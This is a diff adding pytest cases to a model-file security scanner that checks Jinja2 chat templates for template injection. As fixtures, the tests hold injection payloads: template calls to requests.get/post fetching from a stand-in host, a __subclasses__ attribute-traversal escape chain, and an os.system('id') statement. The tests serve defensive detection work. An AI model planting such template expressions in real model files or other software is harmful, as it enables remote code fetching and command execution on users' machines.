@@ -11,7 +11,7 @@ import pytest
 from modelaudit.config.rule_config import ModelAuditConfig, reset_config, set_config
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners import jinja2_template_scanner
-from modelaudit.scanners.base import CheckStatus, IssueSeverity
+from modelaudit.scanners.base import Check, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.jinja2_template_scanner import Jinja2TemplateScanner
 from tests.helpers import create_mock_gguf
 
@@ -43,6 +43,10 @@ def _copy_as_tokenizer_config(source: Path, tmp_path: Path) -> Path:
     target = target_dir / "tokenizer_config.json"
     target.write_text(source.read_text(encoding="utf-8"), encoding="utf-8")
     return target
+
+
+def _jinja_detection_checks(result: ScanResult) -> list[Check]:
+    return [check for check in result.checks if check.name == "Jinja2 Template Injection Detection"]
 
 
 def test_directory_scan_preserves_path_sensitive_yaml_routing(tmp_path: Path) -> None:
@@ -308,6 +312,218 @@ class TestJinja2TemplateScannerFalsePositives:
 
         failed_checks = [c for c in result.checks if c.status == CheckStatus.FAILED]
         assert len(failed_checks) == 0
+
+    def test_prose_requests_in_structured_chat_templates_is_not_ssti(self, tmp_path: Path) -> None:
+        """Pinned Cohere-style prose should not trip request-call SSTI regexes."""
+        huggingface_dir = tmp_path / "huggingface" / "CohereLabs" / "North-Mini-Code-1.0"
+        huggingface_dir.mkdir(parents=True)
+        prose_template = (
+            "{% if tools or documents %}\n"
+            "You should make best use of these skills to serve user's requests.\n"
+            "Think about how to address requests.\n"
+            "{% endif %}\n"
+            "{{ message.content }}"
+        )
+        tokenizer_file = huggingface_dir / "tokenizer_config.json"
+        tokenizer_file.write_text(
+            json.dumps(
+                {
+                    "chat_template": [
+                        {"name": "default", "template": prose_template},
+                        {"name": "tool_use", "template": prose_template},
+                        {"name": "rag", "template": prose_template},
+                    ]
+                }
+            ),
+            encoding="utf-8",
+        )
+
+        result = Jinja2TemplateScanner().scan(str(tokenizer_file))
+
+        assert _jinja_detection_checks(result) == []
+        assert any(
+            check.name == "Jinja2 SSTI Analysis" and check.status == CheckStatus.PASSED for check in result.checks
+        )
+
+    def test_active_requests_call_in_chat_template_is_still_critical(self, tmp_path: Path) -> None:
+        huggingface_dir = tmp_path / "huggingface" / "model"
+        huggingface_dir.mkdir(parents=True)
+        tokenizer_file = huggingface_dir / "tokenizer_config.json"
+        tokenizer_file.write_text(
+            json.dumps(
+                {
+                    "chat_template": [
+                        {
+                            "name": "default",
+                            "template": "{{ requests.get('https://example.test/payload') }}",
+                        }
+                    ]
+                }
+            ),
+            encoding="utf-8",
+        )
+
+        result = Jinja2TemplateScanner().scan(str(tokenizer_file))
+
+        failed_checks = _jinja_detection_checks(result)
+        assert any(
+            check.severity == IssueSeverity.CRITICAL
+            and check.details.get("pattern_type") == "critical_injection"
+            and check.details.get("pattern") == r"requests\."
+            for check in failed_checks
+        )
+
+    def test_active_requests_statement_in_chat_template_is_still_critical(self, tmp_path: Path) -> None:
+        tokenizer_file = tmp_path / "tokenizer_config.json"
+        tokenizer_file.write_text(
+            json.dumps(
+                {
+                    "chat_template": (
+                        "{% set response = requests.post('https://example.test/payload') %}{{ response.status_code }}"
+                    )
+                }
+            ),
+            encoding="utf-8",
+        )
+
+        result = Jinja2TemplateScanner().scan(str(tokenizer_file))
+
+        assert any(
+            check.severity == IssueSeverity.CRITICAL
+            and check.details.get("pattern_type") == "critical_injection"
+            and check.details.get("match_text") == "requests."
+            for check in _jinja_detection_checks(result)
+        )
+
+    def test_raw_and_comment_requests_are_not_executable_ssti(self, tmp_path: Path) -> None:
+        template_file = tmp_path / "requests-docs.jinja"
+        template_file.write_text(
+            "{# requests.get('https://example.test/comment') #}\n"
+            "{% raw %}{{ requests.get('https://example.test/raw') }}{% endraw %}\n"
+            "Use the tool to address user's requests.\n"
+            "{{ message.content }}",
+            encoding="utf-8",
+        )
+
+        result = Jinja2TemplateScanner().scan(str(template_file))
+
+        assert _jinja_detection_checks(result) == []
+
+    def test_active_obfuscated_attribute_traversal_still_detected(self, tmp_path: Path) -> None:
+        template_file = tmp_path / "attr-traversal.jinja"
+        template_file.write_text(
+            "{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}",
+            encoding="utf-8",
+        )
+
+        result = Jinja2TemplateScanner().scan(str(template_file))
+
+        failed_checks = _jinja_detection_checks(result)
+        assert any(check.details.get("pattern_type") == "obfuscation" for check in failed_checks)
+
+    def test_malformed_prose_requests_template_stays_clean(self, tmp_path: Path) -> None:
+        tokenizer_file = tmp_path / "tokenizer_config.json"
+        tokenizer_file.write_text(
+            json.dumps(
+                {
+                    "chat_template": (
+                        "{% if tools %}\nUse available tools to serve user's requests.\nThen respond conversationally."
+                    )
+                }
+            ),
+            encoding="utf-8",
+        )
+
+        result = Jinja2TemplateScanner().scan(str(tokenizer_file))
+
+        assert _jinja_detection_checks(result) == []
+
+    def test_malformed_active_requests_expression_still_detected(self, tmp_path: Path) -> None:
+        tokenizer_file = tmp_path / "tokenizer_config.json"
+        tokenizer_file.write_text(
+            json.dumps({"chat_template": "{{ requests.get('https://example.test/payload')"}),
+            encoding="utf-8",
+        )
+
+        result = Jinja2TemplateScanner().scan(str(tokenizer_file))
+
+        assert any(
+            check.severity == IssueSeverity.CRITICAL
+            and check.details.get("pattern_type") == "critical_injection"
+            and check.details.get("match_text") == "requests."
+            for check in _jinja_detection_checks(result)
+        )
+
+
+class TestJinja2TemplateScannerExecutableSpans:
+    def test_lexer_spans_include_expressions_and_statements_only(self) -> None:
+        spans = Jinja2TemplateScanner._executable_template_spans(
+            "literal requests. {{ requests.get('https://example.test') }} "
+            "{# requests.get('https://example.test/comment') #} "
+            "{% set x = os.system('id') %}"
+        )
+
+        assert [span.text for span in spans] == [
+            "{{ requests.get('https://example.test') }}",
+            "{% set x = os.system('id') %}",
+        ]
+
+    def test_delimiter_fallback_ignores_raw_body_and_comments(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.setattr(jinja2_template_scanner, "HAS_JINJA2_SANDBOX", False)
+
+        spans = Jinja2TemplateScanner._executable_template_spans(
+            "{# requests.get('https://example.test/comment') #}"
+            "{% raw %}{{ requests.get('https://example.test/raw') }}{% endraw %}"
+            "{{ requests.get('https://example.test/live')"
+        )
+
+        assert [span.text for span in spans] == ["{{ requests.get('https://example.test/live')"]
+
+    @pytest.mark.parametrize(
+        "template_content",
+        [
+            pytest.param(
+                "{# \" requests.get('https://example.test/comment') #}\n"
+                "{{ requests.get('https://example.test/live') }}",
+                id="comment-unmatched-quote",
+            ),
+            pytest.param(
+                "{% raw %}"
+                "{% set ignored = \"requests.get('https://example.test/raw') %}"
+                "{{ requests.get('https://example.test/raw-expression') }}"
+                "{% endraw %}\n"
+                "{{ requests.get('https://example.test/live') }}",
+                id="raw-unmatched-quote",
+            ),
+        ],
+    )
+    def test_delimiter_fallback_malformed_ignored_regions_do_not_hide_later_requests(
+        self,
+        template_content: str,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.setattr(jinja2_template_scanner, "HAS_JINJA2_SANDBOX", False)
+
+        spans = Jinja2TemplateScanner._executable_template_spans(template_content)
+
+        assert [span.text for span in spans] == ["{{ requests.get('https://example.test/live') }}"]
+
+        template_file = tmp_path / "malformed-ignored-region.jinja"
+        template_file.write_text(template_content, encoding="utf-8")
+        result = Jinja2TemplateScanner().scan(str(template_file))
+
+        request_checks = [
+            check
+            for check in _jinja_detection_checks(result)
+            if check.severity == IssueSeverity.CRITICAL
+            and check.details.get("pattern_type") == "critical_injection"
+            and check.details.get("match_text") == "requests."
+        ]
+        assert len(request_checks) == 1
 
 
 class TestJinja2TemplateScannerJSONExtraction:
